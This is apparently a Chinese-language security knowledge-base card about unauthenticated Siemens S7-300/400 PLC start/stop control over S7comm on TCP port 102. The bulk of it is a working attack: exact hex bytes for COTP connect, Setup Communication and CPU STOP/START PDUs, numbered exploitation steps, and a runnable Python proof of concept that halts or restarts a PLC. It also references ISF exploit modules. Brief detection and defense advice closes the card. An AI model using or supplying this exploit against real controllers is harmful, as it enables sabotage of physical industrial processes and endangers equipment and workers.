---
id: iot-industrial-s7comm-unauth-cpu-start-stop-control
title: S7comm 未认证 CPU 启停：向 102 端口发送 COTP 连接 + Setup Communication + CPU Start/Stop 原始 PDU，任意可达主机可令 S7-300/400 停机或启动
type: scenario
domain: iot
path: iot/industrial
technique: s7comm-unauth-cpu-start-stop-control
aliases:
- S7comm CPU 启停
- S7-300/400 PLC 控制
- 西门子 PLC 未授权停机
- s7_300_400_plc_control
- PLC start/stop 攻击
- S7 PLC 控制命令
tags:
- iot
- industrial
- s7comm
- plc
- siemens
- unauthenticated
- protocol-reverse
- ot-security
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V562
  verified_at: '2026-11-12T07:47:11+08:00'
  notes: '已对照原文与全部13张截图核对（13/13可读，最长边1920px，无需降采样）：图01-05 snap7 1.4.2下载/bin目录/serverdemo 192.168.2.2/clientdemo Rack0-Slot2连接与CPU315-2信息、图06-07 ISF模块表与isf.py、图08-09 use s7_300_400_plc_control与set target、图10 run输出Target is alive→Stop plc、图11仿真器日志''CPU Control request : STOP --> OK''、图12 Wireshark Setup communication(TPKT len25, func 0xf0)及Notepad字节串、图13 Wireshark样例pcap页，均与卡片一致。报文逐字节复核：COTP连接''0300001611e00000001400c1020100c20201<slot>c0010a''、Setup''0300001902f08032010000020000080000f0000002000201e0''、Stop''0300002102f0803201000006000010000029000000000009505f50524f4752414d''、Start''0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d''与原文payload完全一致；PDU ref 0x0500(start)/0x0600(stop)与检测要点相符。注意原文''cpu_start_payload分析''小节把start报文误解码为setup的0x19字节串，卡片未沿用该错误，step3/4区分正确。affected_versions：原文仅产品系列(S7-200/300/400)未给型号版本/区间，按规则不设置，正确。dedup：top候选均new；既有两张S7comm卡为数据面(Write Var提取/多DB状态伪造)，本卡为控制面0x28/0x29启停，非同链；Modbus/MME/SOME-IP为不同协议，新增成立。危害为未认证关键功能控制(CWE-306)导致PLC停机/非计划启动，非崩溃型DoS，severity
    high合理。未验证点：仅在snap7仿真器实测，未在真实PLC复测。'
---

# 一句话结论

早期 S7 系列（S7-200/300/400）的 S7comm 协议不加密、不认证：任何能连到 PLC TCP/102 端口的主机，先发 COTP 连接请求与 `Setup Communication` 完成会话，再发送功能码 0x28/0x29 的 CPU 控制 PDU，就能让 PLC 进入 STOP（停机）或 START（运行）——无需任何口令，直接控制工业过程。

# 原理

- S7comm 跑在 ISO-on-TCP 之上：TPKT（版本/总长）+ ISO 8073 COTP（连接请求/确认）+ S7 PDU，默认端口 102。S7 PDU 头含协议标识 `0x32`、`ROSCTR`、PDU 引用、参数长度/数据长度；参数区首字节是功能码。
- S7-300/400 使用的 S7comm 没有会话认证与加密，协议本身就把 "CPU 控制" 当作合法功能：功能码 `0x28`（PLC Control，子功能 `0xfd`，参数串 `P_PROGRAM`）用于启动 CPU，功能码 `0x29`（PLC Stop，参数串 `P_PROGRAM`）用于停止 CPU。PLC 只校验报文格式，不校验发送者身份。
- 攻击者因此不需要任何凭据：`Setup Communication` 协商 PDU 长度后直接下发控制 PDU，PLC 侧日志会记录 "CPU Control request : STOP --> OK" 并切换运行模式。
- 为什么危害大：PLC 的 RUN/STOP 是物理过程的开关，STOP 会停止用户程序扫描，导致被控设备停机/失去自动控制；START 可被用来在非计划时刻重启过程。这是"关键功能缺少认证"（CWE-306）在工控协议上的直接体现，而不是报文畸形导致的崩溃。
- 对比：新一代 S7-1500 使用 S7CommPlus，引入会话 ID 等机制；文章认为其安全性明显提高，S7comm 的裸控制命令不能直接照搬。

# 触发条件

- 攻击主机与 PLC 三层可达（现场网/办公网未隔离，或经路由/跳板进入工控网），目标开放 TCP/102。
- 目标为使用 S7comm 的早期 S7 系列（文章实验对象为 S7-300/400；文中提到 S7-200/300/400 均为无加密 S7comm）。
- 目标未启用额外的 CPU 写保护/远程控制禁用措施（如有，需要对应权限或密码）。
- 需要知道 CPU 插槽号（实验默认 slot=2）用于 COTP 连接参数；对标准 S7-300/400 机架该值常见且可枚举/猜测。

# 利用步骤

1. 建立 TCP 连接到目标 102 端口。
2. 发送 COTP 连接请求（按槽位号构造）：`03 00 00 16 11 e0 00 00 00 14 00 c1 02 01 00 c2 02 01 <slot> c0 01 0a`（默认 slot=2），读取 PLC 响应。
3. 发送 Setup Communication：`03 00 00 19 02 f0 80 32 01 00 00 02 00 00 08 00 00 f0 00 00 02 00 02 01 e0`（功能 0xf0，MaxAmQ calling/called=1，PDU 长度 0x01e0=480），读取响应。
4. 发送 CPU 控制 PDU：
   - 停止：`03 00 00 21 02 f0 80 32 01 00 00 06 00 00 10 00 00 29 00 00 00 00 00 09 50 5f 50 52 4f 47 52 41 4d`（func=0x29，参数 `P_PROGRAM`）。
   - 启动：`03 00 00 25 02 f0 80 32 01 00 00 05 00 00 14 00 00 28 00 00 00 00 00 00 fd 00 00 09 50 5f 50 52 4f 47 52 41 4d`（func=0x28，子功能 0xfd，参数 `P_PROGRAM`）。
5. 验证：PLC/仿真器侧出现 `CPU Control request : STOP --> OK`；攻击框架在发送前后各做一次 TCP 连通性检查（停止后目标不可连、启动后恢复）。实验可用 snap7 的 serverdemo（S7-300 仿真）复现，clientdemo 仅用于确认会话/读 SZL。

# PoC

```python
# 最小复现：python3，向 192.168.2.2:102 发送 Setup Communication 后停止/启动 CPU
import socket

def pdu(hexstr):
    return bytes.fromhex(hexstr.replace(' ', ''))

def connect(slot=2):
    create_connect = pdu('03 00 00 16 11 e0 00 00 00 14 00 c1 02 01 00 c2 02 01') + bytes([slot]) + pdu('c0 01 0a')
    setup_comm = pdu('03 00 00 19 02 f0 80 32 01 00 00 02 00 00 08 00 00 f0 00 00 02 00 02 01 e0')
    s = socket.create_connection((target, 102), timeout=3)
    s.sendall(create_connect); s.recv(1024)
    s.sendall(setup_comm);     s.recv(1024)
    return s

cpu_stop  = pdu('03 00 00 21 02 f0 80 32 01 00 00 06 00 00 10 00 00 29 00 00 00 00 00 09 50 5f 50 52 4f 47 52 41 4d')
cpu_start = pdu('03 00 00 25 02 f0 80 32 01 00 00 05 00 00 14 00 00 28 00 00 00 00 00 00 fd 00 00 09 50 5f 50 52 4f 47 52 41 4d')

target = '192.168.2.2'
s = connect(slot=2)
s.sendall(cpu_stop)   # 或 cpu_start
s.close()
```

```text
文章实测环境：snap7 serverdemo 模拟 S7-300（192.168.2.2），ISF 模块 exploits/plcs/siemens/s7_300_400_plc_control 的 run 输出
Target is alive → Stop plc，仿真器日志 "CPU Control request : STOP --> OK"。未在真实 PLC 上复测，置信度 medium。
```

# 变体与关联

- 变体：同一 ISF 框架还提供 `s7_1200_plc_control`（S7-1200 start/stop/reset）、`quantum_140_plc_control`（Schneider Quantum 140 start/stop）、`profinet_set_ip`（DCP 改设备 IP）等模块，说明"未认证控制命令"是工控协议通病而非西门子独有。
- 关联：`iot-industrial-s7comm-write-var-payload-extraction`（从 S7comm Write Var 流量还原写入载荷）和 `iot-industrial-s7comm-elevator-multi-db-state-forgery`（多 DB 伪造状态欺骗 HMI），分别对应数据面读写与状态伪造；本卡是控制面启停。
- 关联：`iot-industrial-modbus-write-command-source-shielding` 同样属于"工控协议可被任意主机改写控制行为"的可用性/完整性影响，但协议与报文结构不同。
- 边界：S7CommPlus（S7-1500）带会话 ID，本卡的裸 PDU 不适用；目标启用 CPU 保护或网络隔离时需要先突破相应限制。

# 检测与防御

- 检测：监控工控网内访问 PLC TCP/102 的非工程站 IP，尤其出现 COTP 连接后紧跟 S7 功能码 0x28/0x29（PLC Control/Stop、`P_PROGRAM`）的会话；PLC 诊断缓冲区出现非计划 STOP/START 与 "CPU Control request" 记录；结合 ISF/snap7 默认特征（PDU 引用 0x0500/0x0600、固定模板报文）做流量规则。
- 防御：工控网与办公网严格隔离，102 端口仅对工程师站白名单开放；PLC 启用写保护/远程控制限制与访问口令；优先选用 S7-1500 等带 S7CommPlus 会话机制的型号并启用其安全功能；部署工控流量审计（深度解析 TPKT/COTP/S7comm 功能码），对控制面命令做告警与阻断。
